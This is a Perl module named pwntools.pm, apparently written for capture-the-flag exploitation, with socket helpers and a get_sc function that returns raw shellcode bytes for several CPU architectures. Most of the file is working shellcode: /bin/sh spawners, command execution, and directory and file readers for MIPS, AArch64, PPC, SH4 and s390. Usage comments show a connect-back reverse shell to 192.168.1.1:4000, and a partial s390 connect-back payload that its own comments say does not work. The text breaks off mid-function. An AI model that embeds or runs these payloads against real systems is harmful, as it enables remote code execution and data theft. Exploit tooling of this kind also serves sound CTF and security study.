#!/usr/bin/perl
#
# pwntools.pm
#
# Copyright (c) 2014-2019 gpp256
# This software is distributed under the MIT License.
#
# TODO:
#  各種CPUアーキテクチャ対応(z80/v850)
#  0x00を使わずに実装できていないshellcodeの見直し
#  各種OS対応(Linux/FreeBSD/Solaris/Windows)
#
# 完了:
#  各種CPUアーキテクチャ対応(x86/x86-64/arm/s390/aarch64/mips/sh4/ppc)
#  fsb対応
#  UDP対応
#  
package pwntools;
use Socket qw(PF_INET SOCK_STREAM SOCK_DGRAM pack_sockaddr_in inet_aton);
BEGIN {
	$|=1;
	$ARCH = 'x86';
};

#use constant CONF =>'.pwntools.conf';

use Exporter 'import';
our @EXPORT = qw/connect get_udpsocket read_until interact get_sc bin_to_ascii get_fsbstr get_fsbleakstr cbuf p u/;
our @EXPORT_OK = qw/ /;

# connect(\$socket, $addr, $port)
sub connect {
	my $s = shift || return undef;
	my $addr = shift; my $port = shift; 
	socket($$s, PF_INET, SOCK_STREAM, 0) or return undef;
	connect($$s, pack_sockaddr_in($port, inet_aton($addr))) or return undef;
	my $old_handle = select $$s; $| = 1; select $old_handle;
	return 1;
}

# $sock_addr = &get_udpsocket(\$socket, $addr, $port);
# send($socket, "X" x $size, 0, $sock_addr) foreach (1..$loop_num); close $socket;
sub get_udpsocket {
	my $s = shift || return undef;
	my $addr = shift; my $port = shift; 
	socket($$s, PF_INET, SOCK_DGRAM, 0) or return undef;
	my $old_handle = select $$s; $| = 1; select $old_handle;
	return pack_sockaddr_in($port, inet_aton($addr));
}

# read_until($socket, $keyword);
# read_until($socket, $keyword, $timeout);
sub read_until {
	my $socket = shift || return undef;
	my $k = shift || return undef;
	my $timeout = shift || 3;
	my $r = '';
	my $tmp = '';
	eval {
	$SIG{ALRM} = sub {die};
	alarm($timeout);
	while(1) {
	        sysread($socket, $tmp, 1) or last;
	        $r.=$tmp;
                if ($tmp =~ /congra|flag/i) { print "[+] $r"; exit(0); }
                last if ($r =~ /$k/);
	}
	alarm(0);
	};
	if ($@) {
	print "\n[-] ERROR: TIMEOUT\n"; exit(1);
	}
	return $r;
}

#$sc = &get_sc('x86', 'sh');
#$sc = &get_sc('x86', 'dup2', 4);
#$sc = &get_sc('x86', 'execcmd', 'ls -l;cat flag');
#$sc = &get_sc('x86', 'readdir', '.');
#$sc = &get_sc('x86', 'readfile', './flag');
#$sc = &get_sc('x86', 'portbind', 4000);
#$sc = &get_sc('x86', 'connectback', '192.168.1.1', 4000);
#$sc = &get_sc('x86', 'stager', 1);
#$sc = &get_sc('x86-64', 'sh');
#$sc = &get_sc('x86-64', 'dup2', 4);
#$sc = &get_sc('x86-64', 'execcmd', 'ls -l;cat flag');
#$sc = &get_sc('x86-64', 'readdir', '.', $bss_addr);
#$sc = &get_sc('x86-64', 'readfile', './flag');
#$sc = &get_sc('x86-64', 'portbind', 4000);
#$sc = &get_sc('x86-64', 'connectback', '192.168.1.1', 4000);
#$sc = &get_sc('x86-64', 'stager', 1, $bss_addr);
#$sc = &get_sc('arm', 'sh');
#$sc = &get_sc('arm', 'dup2', 4);
#$sc = &get_sc('arm', 'execcmd', 'ls -l;cat flag');
#$sc = &get_sc('arm', 'readdir', '.', $bss_addr);
#$sc = &get_sc('arm', 'readfile', './flag');
#$sc = &get_sc('arm', 'connectback', '192.168.1.1', 4000);
#$sc = &get_sc('arm', 'stager', 1, $bss_addr);
#$sc = &get_sc('s390', 'sh');
#$sc = &get_sc('s390', 'execcmd', 'ls -l;cat flag');
#$sc = &get_sc('s390', 'readdir', '.');
#$sc = &get_sc('s390', 'readfile', './flag');
#$sc = &get_sc('s390', 'connectback', '192.168.1.1', 4000);
sub get_sc {
	my $arch = shift || return '';
	my $type = shift || return '';
	my $ret = '';
	if ($arch eq 'x86') {
		$ret = &get_x86_binary($type, @_);
	} 
	elsif ($arch eq 'x86-64') {
		$ret = &get_x86_64_binary($type, @_);
	}
	elsif ($arch eq 'arm') {
		$ret = &get_arm_binary($type, @_);
	}
	elsif ($arch eq 'z80') {
		$ret = '';
	}
	elsif ($arch eq 'aarch64') {
		$ret = &get_aarch64_binary($type, @_);
	}
	elsif ($arch eq 'ppc') {
		$ret = &get_ppc_binary($type, @_);
	}
	elsif ($arch eq 's390') {
		$ret = &get_s390_binary($type, @_);
	}
	elsif ($arch eq 'v850') {
		$ret = &get_v850_binary($type, @_);
	}
	elsif ($arch eq 'sh4') {
		$ret = &get_sh4_binary($type, @_);
	}
	elsif ($arch eq 'mips') {
		$ret = &get_mips_binary($type, @_);
	}
	return $ret;
}

sub get_v850_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
	} 
	elsif ($type eq 'dup2') {
	}
	elsif ($type eq 'execcmd') { 
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
	}
	elsif ($type eq 'readfile') { 
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
	}
	elsif ($type eq 'stager') { 
	}
	return $ret;
}

# レジスタr0にシステムコール番号をセット
# レジスタr3,r4,r5,r6,r7,r8にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# sc 命令を実行
# 戻り値はr3
# nop=>\x60\x00\x00\x00(他の命令で代用する必要有)
# return address=> LR(mfspr命令でアクセス可能)
sub get_ppc_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#10000054:       48 00 00 18     b       1000006c <_bbb>
		#10000058 <_aaa>:
		#10000058:       7c 68 02 a6     mflr    r3 =>mfspr 3,8
		#1000005c:       38 00 00 0b     li      r0,11
		#10000060:       7c 84 22 78     xor     r4,r4,r4
		#10000064:       7c a5 2a 78     xor     r5,r5,r5
		#10000068:       44 00 04 02     sc      32
		#1000006c <_bbb>:
		#1000006c:       4b ff ff ed     bl      10000058 <_aaa>
		#10000070:       2f 62 69 6e     cmpi    cr6,1,r2,26990
		#10000074:       2f 73 68 00     cmpi    cr6,1,r19,26624
		$ret =  "\x48\x00\x00\x18\x7c\x68\x02\xa6\x38\x00\x00\x0b".
			"\x7c\x84\x22\x78\x7c\xa5\x2a\x78\x44\x00\x04\x02\x4b\xff\xff\xed".
			"\x2f\x62\x69\x6e\x2f\x73\x68\x00";
	} 
	elsif ($type eq 'dup2') {
	}
	elsif ($type eq 'execcmd') { 
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
	}
	elsif ($type eq 'readfile') { 
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
	}
	elsif ($type eq 'stager') { 
	}
	return $ret;
}

# レジスタr3にシステムコール番号をセット
# レジスタr4,r5,r6,r7,r8,r9にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# trapa #2 命令を実行
# 戻り値はr0
# nop=>\x00\x09(他の命令で代用する必要有)
# pr=>return address
# pc=>program counter
# 遅延スロット有
# r15=>stack pointer
sub get_sh4_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#http://shell-storm.org/shellcode/files/shellcode-771.php
		#"\x0b\xe3"//           mov     #11,r3
		#"\x02\xc7"//           mova    @(10,pc),r0
		#"\x03\x64"//           mov     r0,r4
		#"\x5a\x25"//           xor     r5,r5
		#"\x6a\x26"//           xor     r6,r6
		#"\x02\xc3"//           trapa   #2
		#"/bin/sh";
		$ret = "\x0b\xe3\x02\xc7\x03\x64\x5a\x25\x6a\x26\x02\xc3"."/bin/sh\x00";
	} 
	elsif ($type eq 'dup2') {
	}
	elsif ($type eq 'execcmd') { 
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
	}
	elsif ($type eq 'readfile') { 
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
	}
	elsif ($type eq 'stager') { 
	}
	return $ret;
}

# レジスタv0にシステムコール番号をセット
# レジスタa0,a1,a2,a3,a4,a5にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# syscall 命令を実行
# 戻り値はv0
# nop=>\x24\x09\x73\x50
# sp=>stack pointer
# ra=>return address
# gp=>global pointer
# fp=>frame pointer
# 遅延スロット有
# 0x00を使わずにshellcodeを書くためTips:
#  レジスタのゼロクリア=>slti a1,zero,-1  ; 0が-1より小さければ1、そうでない場合は0。結局0が格納される
#  ロード命令lw、ストア命令swを活用する
#    "\xaf\xa2\xff\xfc"       //  sw      v0,-4(sp)
#    "\x8f\xa4\xff\xfc"       //  lw      a0,-4(sp)
#  ゼロレジスタzeroを活用する
#  システムコールの呼び出しにはsyscall 0x40404を使う
#  nop=>"\x24\x09\x73\x50"       //  li      t1,29520 (nop)
#  レジスタに1バイトの整数を格納したい場合=>        
#    "\x24\x09\xff\xd3"       //  li      t1,-45
#    "\x01\x20\x30\x27"     //  nor     a2,t1,zero       ; a2=～(t1|zero)
#  O_DIRECTORY =0x10000と定義されているがopen(2)の第二引数に0x1010000を指定しても動作上問題はない。
#    lui(Load Upper Imm)の1命令で第二引数を作ることができる
sub get_mips_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		$ret = "".
		"\x28\x06\xff\xff".   #/* slti    a2,zero,-1   */
		"\x3c\x0f\x2f\x2f".   #/* lui     t7,0x2f2f    */
		"\x35\xef\x62\x69".   #/* ori     t7,t7,0x6269 */
		"\xaf\xaf\xff\xf4".   #/* sw      t7,-12(sp)   */
		"\x3c\x0e\x6e\x2f".   #/* lui     t6,0x6e2f    */
		"\x35\xce\x73\x68".   #/* ori     t6,t6,0x7368 */
		"\xaf\xae\xff\xf8".   #/* sw      t6,-8(sp)    */
		"\xaf\xa0\xff\xfc".   #/* sw      zero,-4(sp)  */
		"\x27\xa4\xff\xf4".   #/* addiu   a0,sp,-12    */
		"\x28\x05\xff\xff".   #/* slti    a1,zero,-1   */
		"\x24\x02\x0f\xab".   #/* li      v0,4011      */
		"\x01\x01\x01\x0c";   #/* syscall 0x40404      */
	} 
	elsif ($type eq 'dup2') {
	}
	elsif ($type eq 'execcmd') { 
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
		#00400090 <_ftext>:
		#  400090:       24067350        li      a2,29520
		#00400094 <LB>:
		#  400094:       04d0ffff        bltzal  a2,400094 <LB>
		#  40009c:       240f7350        li      t7,29520
		#  4000a0:       240fffa7        li      t7,-89 ; -85=0xa7->0xab
		#  4000a4:       01e07827        nor     t7,t7,zero
		#  4000a8:       03ef2021        addu    a0,ra,t7
		#  4000ac:       3c050101        lui     a1,0x101
		#  4000b0:       24020fa5        li      v0,4005
		#  4000b4:       0101010c        syscall 0x40404
		#  4000b8:       afa2fffc        sw      v0,-4(sp)
		#  4000bc:       8fa4fffc        lw      a0,-4(sp)
		#  4000c0:       240fffcf        li      t7,-49        ; -49=0xcf->0x7f
		#  4000c4:       01e07827        nor     t7,t7,zero
		#  4000c8:       03af2821        addu    a1,sp,t7
		#  4000cc:       2409ff80        li      t1,-128
		#  4000d0:       01203027        nor     a2,t1,zero
		#  4000d4:       2402102d        li      v0,4141
		#  4000d8:       0101010c        syscall 0x40404
		#  4000dc:       2409fffe        li      t1,-2
		#  4000e0:       01202027        nor     a0,t1,zero
		#  4000e4:       24020fa4        li      v0,4004
		#  4000e8:       0101010c        syscall 0x40404
		#  4000ec:       24020fa1        li      v0,4001
		#  4000f0:       0101010c        syscall 0x40404
		#  4000f4:       2e000000        sltiu   zero,s0,0
		my $dir = shift || return '';
		$ret = "".
		"\x24\x06\x73\x50\x04\xd0\xff\xff\x24\x0f\x73\x50".
		"\x24\x0f\xff\xab\x01\xe0\x78\x27\x03\xef\x20\x21\x3c\x05\x01\x01".
		"\x24\x02\x0f\xa5\x01\x01\x01\x0c\xaf\xa2\xff\xfc\x8f\xa4\xff\xfc".
		"\x24\x0f\xff\x7f\x01\xe0\x78\x27\x03\xaf\x28\x21\x24\x09\xff\x80".
		"\x01\x20\x30\x27\x24\x02\x10\x2d\x01\x01\x01\x0c\x24\x09\xff\xfe".
		"\x01\x20\x20\x27\x24\x02\x0f\xa4\x01\x01\x01\x0c\x24\x02\x0f\xa1".
		"\x01\x01\x01\x0c".$dir."\x00";
	}
	elsif ($type eq 'readfile') { 
		#  400090:       24067350        li      a2,29520
		#00400094 <LB>:
		#  400094:       04d0ffff        bltzal  a2,400094 <LB>
		#  40009c:       240f7350        li      t7,29520
		#  4000a0:       240fffa7        li      t7,-89  ; -85=0xa7->0xab
		#  4000a4:       01e07827        nor     t7,t7,zero
		#  4000a8:       03ef2021        addu    a0,ra,t7
		#  4000ac:       2805ffff        slti    a1,zero,-1
		#  4000b0:       24020fa5        li      v0,4005
		#  4000b4:       0101010c        syscall 0x40404
		#  4000b8:       afa2fffc        sw      v0,-4(sp)
		#  4000bc:       8fa4fffc        lw      a0,-4(sp)
		#  4000c0:       240fffcf        li      t7,-49
		#  4000c4:       01e07827        nor     t7,t7,zero
		#  4000c8:       03af2821        addu    a1,sp,t7
		#  4000cc:       2409ff80        li      t1,-128
		#  4000d0:       01203027        nor     a2,t1,zero
		#  4000d4:       24020fa3        li      v0,4003
		#  4000d8:       0101010c        syscall 0x40404
		#  4000dc:       2409fffe        li      t1,-2
		#  4000e0:       01202027        nor     a0,t1,zero
		#  4000e4:       24020fa4        li      v0,4004
		#  4000e8:       0101010c        syscall 0x40404
		#  4000ec:       24020fa1        li      v0,4001
		#  4000f0:       0101010c        syscall 0x40404
		#  4000f4:       2e2f666c        sltiu   t7,s1,26220
		#  4000f8:       61670000        0x61670000
		my $file = shift || return '';
		#my $offset = shift || 0x78;
		$ret = "".
		"\x24\x06\x73\x50\x04\xd0\xff\xff\x24\x0f\x73\x50".
		"\x24\x0f\xff\xab\x01\xe0\x78\x27\x03\xef\x20\x21\x28\x05\xff\xff".
		"\x24\x02\x0f\xa5\x01\x01\x01\x0c\xaf\xa2\xff\xfc\x8f\xa4\xff\xfc".
		"\x24\x0f\xff\xcf\x01\xe0\x78\x27\x03\xaf\x28\x21\x24\x09\xff\x80".
		"\x01\x20\x30\x27\x24\x02\x0f\xa3\x01\x01\x01\x0c\x24\x09\xff\xfe".
		"\x01\x20\x20\x27\x24\x02\x0f\xa4\x01\x01\x01\x0c\x24\x02\x0f\xa1".
		"\x01\x01\x01\x0c".$file."\x00";
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
	}
	elsif ($type eq 'stager') { 
	}
	return $ret;
}

# レジスタx8にシステムコール番号をセット
# レジスタx0,x1,x2,x3,x4,x5,x6にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# svc #0x0命令を実行
# 戻り値はx0
# レジスタspがスタックポインタの格納先
# nop=>\x1f\x20\x03\xd5
# return address=> x30
sub get_aarch64_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#   0:   14000006        b       0x18
		#   4:   aa1e03e0        mov     x0, x30
		#   8:   ca010021        eor     x1, x1, x1
		#   c:   aa0103e2        mov     x2, x1
		#  10:   d2801ba8        mov     x8, #0xdd                       // #221=execve
		#  14:   d4000001        svc     #0x0
		#  18:   97fffffb        bl      0x4
		#  1c:   6e69622f        
		#  20:   68732f2f        
		$ret =  "\x06\x00\x00\x14\xe0\x03\x1e\xaa\x21\x00\x01\xca\xe2\x03\x01\xaa\xa8\x1b\x80\xd2\x01\x00\x00\xd4\xfb\xff\xff\x97".
				"\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
	} 
	elsif ($type eq 'dup2') {
	}
	elsif ($type eq 'execcmd') { 
		#   0:   1400001e        b       0x78
		#   4:   aa1e03e6        mov     x6, x30
		#   8:   d10403ff        sub     sp, sp, #0x100
		#   c:   ca020042        eor     x2, x2, x2
		#  10:   d28c65a5        mov     x5, #0x632d                     // #25389
		#  14:   f90003e5        str     x5, [sp]
		#  18:   910003e5        mov     x5, sp
		#  1c:   910023ff        add     sp, sp, #0x8
		#  20:   f90003e2        str     x2, [sp]
		#  24:   910023ff        add     sp, sp, #0x8
		#  28:   d28c45e0        mov     x0, #0x622f                     // #25135
		#  2c:   f2adcd20        movk    x0, #0x6e69, lsl #16
		#  30:   f2c5e5e0        movk    x0, #0x2f2f, lsl #32
		#  34:   f2ed0e60        movk    x0, #0x6873, lsl #48
		#  38:   f90003e0        str     x0, [sp]
		#  3c:   910003e0        mov     x0, sp
		#  40:   910023ff        add     sp, sp, #0x8
		#  44:   f90003e2        str     x2, [sp]
		#  48:   910023ff        add     sp, sp, #0x8
		#  4c:   f90003e0        str     x0, [sp]
		#  50:   910003e1        mov     x1, sp
		#  54:   910023ff        add     sp, sp, #0x8
		#  58:   f90003e5        str     x5, [sp]
		#  5c:   910023ff        add     sp, sp, #0x8
		#  60:   f90003e6        str     x6, [sp]
		#  64:   910023ff        add     sp, sp, #0x8
		#  68:   f90003e2        str     x2, [sp]
		#  6c:   d2800002        mov     x2, #0x0                        // #0
		#  70:   d2801ba8        mov     x8, #0xdd                       // #221
		#  74:   d4000001        svc     #0x0
		#  78:   97ffffe3        bl      0x4
		my $cmd = shift || return '';
		return '' if (length($cmd) < 1);
		$ret = "".
			"\x1e\x00\x00\x14\xe6\x03\x1e\xaa\xff\x03\x04\xd1\x42\x00\x02\xca".
			"\xe2\x03\x00\xf9\xff\x23\x00\x91\xa5\x65\x8c\xd2\xe5\x03\x00\xf9".
			"\xe5\x03\x00\x91\xff\x23\x00\x91\xe0\x45\x8c\xd2\x20\xcd\xad\xf2".
			"\xe0\xe5\xc5\xf2\x60\x0e\xed\xf2\xe0\x03\x00\xf9\xe0\x03\x00\x91".
			"\xff\x23\x00\x91\xe2\x03\x00\xf9\xff\x23\x00\x91\xe0\x03\x00\xf9".
			"\xe1\x03\x00\x91\xff\x23\x00\x91\xe5\x03\x00\xf9\xff\x23\x00\x91".
			"\xe6\x03\x00\xf9\xff\x23\x00\x91\xe2\x03\x00\xf9\x02\x00\x80\xd2".
			"\xa8\x1b\x80\xd2\x01\x00\x00\xd4\xe3\xff\xff\x97".$cmd."\x00";
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
		#   0:   14000010        b       0x40
		#   4:   aa1e03e1        mov     x1, x30
		#   8:   92800c60        mov     x0, #0xffffffffffffff9c         // #-100
		#   c:   d2880002        mov     x2, #0x4000                     // #16384
		#  10:   d2800708        mov     x8, #0x38                       // #56
		#  14:   d4000001        svc     #0x0
		#  18:   910003e1        mov     x1, sp
		#  1c:   91019021        add     x1, x1, #0x64
		#  20:   d2802002        mov     x2, #0x100                      // #256
		#  24:   d28007a8        mov     x8, #0x3d                       // #61
		#  28:   d4000001        svc     #0x0
		#  2c:   d2800020        mov     x0, #0x1                        // #1
		#  30:   d2800808        mov     x8, #0x40                       // #64
		#  34:   d4000001        svc     #0x0
		#  38:   d2800ba8        mov     x8, #0x5d                       // #93
		#  3c:   d4000001        svc     #0x0
		#  40:   97fffff1        bl      0x4
		#  44:   0000002e        .inst   0x0000002e ; undefined
		my $dir = shift || return '';
		$ret = "".
			"\x10\x00\x00\x14\xe1\x03\x1e\xaa\x60\x0c\x80\x92\x02\x00\x88\xd2".
			"\x08\x07\x80\xd2\x01\x00\x00\xd4\xe1\x03\x00\x91\x21\x90\x01\x91".
			"\x02\x20\x80\xd2\xa8\x07\x80\xd2\x01\x00\x00\xd4\x20\x00\x80\xd2".
			"\x08\x08\x80\xd2\x01\x00\x00\xd4\xa8\x0b\x80\xd2\x01\x00\x00\xd4".
			"\xf1\xff\xff\x97".$dir."\x00";
	}
	elsif ($type eq 'readfile') { 
		#   0:   14000010        b       0x40
		#   4:   aa1e03e1        mov     x1, x30
		#   8:   92800c60        mov     x0, #0xffffffffffffff9c         // #-100
		#   c:   d2800002        mov     x2, #0x0                        // #0
		#  10:   d2800708        mov     x8, #0x38                       // #56
		#  14:   d4000001        svc     #0x0
		#  18:   910003e1        mov     x1, sp
		#  1c:   91019021        add     x1, x1, #0x64
		#  20:   d2800fe2        mov     x2, #0x7f                       // #127
		#  24:   d28007e8        mov     x8, #0x3f                       // #63
		#  28:   d4000001        svc     #0x0
		#  2c:   d2800020        mov     x0, #0x1                        // #1
		#  30:   d2800808        mov     x8, #0x40                       // #64
		#  34:   d4000001        svc     #0x0
		#  38:   d2800ba8        mov     x8, #0x5d                       // #93
		#  3c:   d4000001        svc     #0x0
		#  40:   97fffff1        bl      0x4
		#  44:   6c662f2e        
		#  48:   00006761        
		my $file = shift || return '';
		#my $offset = shift || 0x78;
		$ret = "".
			"\x10\x00\x00\x14\xe1\x03\x1e\xaa\x60\x0c\x80\x92\x02\x00\x80\xd2".
			"\x08\x07\x80\xd2\x01\x00\x00\xd4\xe1\x03\x00\x91\x21\x90\x01\x91".
			"\xe2\x0f\x80\xd2\xe8\x07\x80\xd2\x01\x00\x00\xd4\x20\x00\x80\xd2".
			"\x08\x08\x80\xd2\x01\x00\x00\xd4\xa8\x0b\x80\xd2\x01\x00\x00\xd4".
			"\xf1\xff\xff\x97".$file."\x00";
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
	}
	elsif ($type eq 'stager') { 
	}
	return $ret;
}

# レジスタr1にシステムコール番号をセット
# レジスタr2,r3,r4,r5,r6,r7にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# svc 0命令を実行(オペランドでsyscall#を指定することもできる)
# 戻り値はr2
# nop=>\x07\x07
# r14 : return address
# r15 : stack pointer
sub get_s390_binary {
    # https://github.com/torvalds/linux/blob/v2.6.24/include/asm-s390/unistd.h
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#   0:   0d 10                   basr    %r1,%r0
		#   2:   41 20 10 0a             la      %r2,10(%r1)
		#   6:   17 33                   xr      %r3,%r3
		#   8:   17 44                   xr      %r4,%r4
		#   a:   0a 0b                   svc     11
		#   c:   2f 62                   
		#   e:   69 6e 2f 2f             
		#  12:   73 68 00 07             
		$ret =  "\x0d\x10\x41\x20\x10\x0a\x17\x33\x17\x44\x0a\x0b\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x00";
	} 
	elsif ($type eq 'dup2') {
	}
	elsif ($type eq 'execcmd') { 
		my $cmd = shift || return '';
		return '' if (length($cmd) < 1);
		# http://blog.divine-protection.com/2014/02/olympic-ctf-2014-zpwn-s390x-exploitation.html
		$ret =  "\x0d\x10\x17\x66\xa7\x29\x00\x02\xa7\x39\x00\x01\x18\x46\xeb\x24\xf0\x80\x00\x24\xa7\x29\x00".
				"\x01\x41\x30\xf0\x80\x0a\x66\x42\x60\xf0\x80\x18\x72\x41\x30\x10\x5c\xa7\x49\x00\x10\xeb\x24\xf0\x88\x00".
				"\x24\xa7\x29\x00\x03\x41\x30\xf0\x88\x0a\x66\x18\x27\xb9\x82\x00\x33\x0a\x3f\xa7\x3a\x00".
				"\x01\x0a\x3f\x41\x20\x10\x64\xe3\x20\x10\x6c\x00\x24\x41\x30\x10\x6c\xb9\x82\x00\x44\x0a\x0b\x00".
				"\x02\x1f\x2b\x62\xef\x80\x82".$cmd."\x00";
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
		#   0:   a7 18 00 05             lhi     %r1,5
		#   4:   c0 20 00 00 00 19       larl    %r2,0x36 -> 0x32
		#   a:   a7 38 00 00             lhi     %r3,0
		#   e:   a7 48 00 00             lhi     %r4,0 # 不要
		#  12:   0a 00                   svc     0
		#  14:   a7 18 00 8d             lhi     %r1,141
		#  18:   41 30 f0 78             la      %r3,120(%r15)
		#  1c:   a7 48 00 ff             lhi     %r4,255
		#  20:   0a 00                   svc     0
		#  22:   a7 48 00 ff             lhi     %r4,255 # 不要?
		#  26:   a7 28 00 01             lhi     %r2,1
		#  2a:   a7 18 00 04             lhi     %r1,4
		#  2e:   0a 00                   svc     0
		#  30:   a7 18 00 01             lhi     %r1,1
		#  34:   0a 00                   svc     0
		#  36:   2e 00                   awr     %f0,%f0
		my $dir = shift || return '';
		my $offset = shift || 0x78;
		$ret =  "\xa7\x18\x00\x05\xc0\x20\x00\x00\x00\x17\xa7\x38\x00\x00\x0a\x00".
				"\xa7\x18\x00\x8d\x41\x30\xf0".pack('C', $offset)."\xa7\x48\x00\x9f\x0a\x00".
				"\xa7\x48\x00\x9f\xa7\x28\x00\x01\xa7\x18\x00\x04\x0a\x00".
				"\xa7\x18\x00\x01\x0a\x00".$dir."\x00";
	}
	elsif ($type eq 'readfile') { 
		#   0:   a7 18 00 05             lhi     %r1,5
		#   4:   c0 20 00 00 00 17       larl    %r2,0x32
		#   a:   a7 38 00 00             lhi     %r3,0
		#   e:   0a 00                   svc     0
		#  10:   a7 18 00 03             lhi     %r1,3
		#  14:   41 30 f0 78             la      %r3,120(%r15)
		#  18:   a7 48 00 20             lhi     %r4,32
		#  1c:   0a 00                   svc     0
		#  1e:   a7 48 00 20             lhi     %r4,32
		#  22:   a7 28 00 01             lhi     %r2,1
		#  26:   a7 18 00 04             lhi     %r1,4
		#  2a:   0a 00                   svc     0
		#  2c:   a7 18 00 01             lhi     %r1,1
		#  30:   0a 00                   svc     0
		#  32:   2e 2f                   awr     %f2,%f15
		#  34:   66 6c 61 67             .long   0x666c6167
		#  38:   00 07 07 07             .long   0x00070707
		my $file = shift || return '';
		my $offset = shift || 0x78;
		$ret =  "\xa7\x18\x00\x05\xc0\x20\x00\x00\x00\x17\xa7\x38\x00\x00\x0a\x00".
				"\xa7\x18\x00\x03\x41\x30\xf0".pack('C', $offset)."\xa7\x48\x00\x20\x0a\x00".
				"\xa7\x48\x00\x30\xa7\x28\x00\x01\xa7\x18\x00\x04\x0a\x00".
				"\xa7\x18\x00\x01\x0a\x00".$file."\x00";
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
		# http://pc-freak.net/tools/ttyspawning/unix_based/390connectback.c
		# 0x0を含めない工夫をしていて参考になるが、動作しない
		# execve(2)まではキックできるが、/bin/shのアドレス指定が間違っている?
		# strace64すると次のようなエラーが出る
		#[pid  8478] execve(0xfffffffffffffffe, [0x3ff7ffffbba], [/* 0 vars */]) = -1 ENOENT (No such file or directory)
		my $ipaddr = shift || return '';
		$ipaddr = &ipv4addr_to_int($ipaddr);
		return '' if (!defined $ipaddr);
		my $port = shift || return '';
		$port = int($port);
		return '' if ($port < 0 || $port > 65535);
		$ret = "".
		"\x0d\x10".             		#/* basr    %r1,%r0			*/
		"\x41\x90\x10\xa8".         	#/* la      %r9,168(%r1)			*/
		"\xa7\x68\x04\x56".          	#/* lhi     %r6,1110			*/
		"\xa7\xa8\xfb\xb4".           	#/* lhi     %r10,-1100			*/
		"\x1a\x6a".                 	#/* ar      %r6,%r10			*/
		"\x42\x60\x10\xa8".           	#/* stc     %r6,168(%r1)			*/
		"\xa7\x28\x04\x4e".           	#/* lhi     %r2,1102			*/
		"\x1a\x2a".                		#/* ar      %r2,%r10			*/
		"\x40\x20\xf0\x78".           	#/* sth     %r2,120(%r15)		*/
		"\xa7\x38".pack('n', $port).	#/* lhi     %r3,31337			*/
		"\x40\x30\xf0\x7a".          	#/* sth     %r3,122(%r15)		*/
		"\x58\x40\x10\xac".           	#/* l       %r4,172(%r1)			*/
		"\x50\x40\xf0\x7c".            	#/* st      %r4,124(%r15)		*/
		"\x17\x44".                 	#/* xr      %r4,%r4			*/
		"\xa7\x38\x04\x4d".            	#/* lhi     %r3,1101			*/
		"\x1a\x3a".                  	#/* ar      %r3,%r10			*/
		"\x90\x24\xf0\x80".           	#/* stm     %r2,%r4,128(%r15)		*/
		"\xa7\x28\x04\x4d".           	#/* lhi     %r2,1101			*/
		"\x1a\x2a".                 	#/* ar      %r2,%r10			*/
		"\x41\x30\xf0\x80".           	#/* la      %r3,128(%r15)		*/
		"\x0d\xe9".                  	#/* basr    %r14,%r9			*/
		"\x18\x72".                  	#/* lr      %r7,%r2			*/
		"\x41\x30\xf0\x78".           	#/* la      %r3,120(%r15)		*/
		"\xa7\x88\x04\x5c".           	#/* lhi     %r8,1116			*/
		"\x1a\x8a".                 	#/* ar      %r8,%r10			*/
		"\x18\x48".                 	#/* lr      %r4,%r8			*/
		"\x90\x24\xf0\x80".             #/* stm     %r2,%r4,128(%r15)		*/
		"\xa7\x28\x04\x4f".             #/* lhi     %r2,1103			*/
		"\x1a\x2a".                 	#/* ar      %r2,%r10			*/
		"\x41\x30\xf0\x80".           	#/* la      %r3,128(%r15)		*/
		"\x0d\xe9".                  	#/* basr    %r14,%r9			*/
		"\x18\x27".                  	#/* lr      %r2,%r7			*/
		"\xa7\x68\x04\x8b".            	#/* lhi     %r6,1163			*/
		"\x1a\x6a".                  	#/* ar      %r6,%r10			*/
		"\x42\x60\x10\xa9".             #/* stc     %r6,169(%r1)			*/
		"\xa7\x38\x04\x4e".           	#/* lhi     %r3,1102			*/
		"\x1a\x3a".                  	#/* ar      %r3,%r10			*/
		"\x0d\xe9".                  	#/* basr    %r14,%r9			*/
		"\xa7\x3a\xff\xff".          	#/* ahi     %r3,-1			*/
		"\x0d\xe9".                  	#/* basr    %r14,%r9			*/
		"\xa7\x3a\xff\xff".         	#/* ahi     %r3,-1			*/
		"\x0d\xe9".                  	#/* basr    %r14,%r9			*/
		"\xa7\x68\x04\x57".           	#/* lhi     %r6,1111			*/
		"\x1a\x6a".                  	#/* ar      %r6,%r10			*/
		"\x42\x60\x10\xa9".            	#/* stc     %r6,169(%r1)			*/
		"\x41\x20\x10\xb0".            	#/* la      %r2,176(%r1)			*/
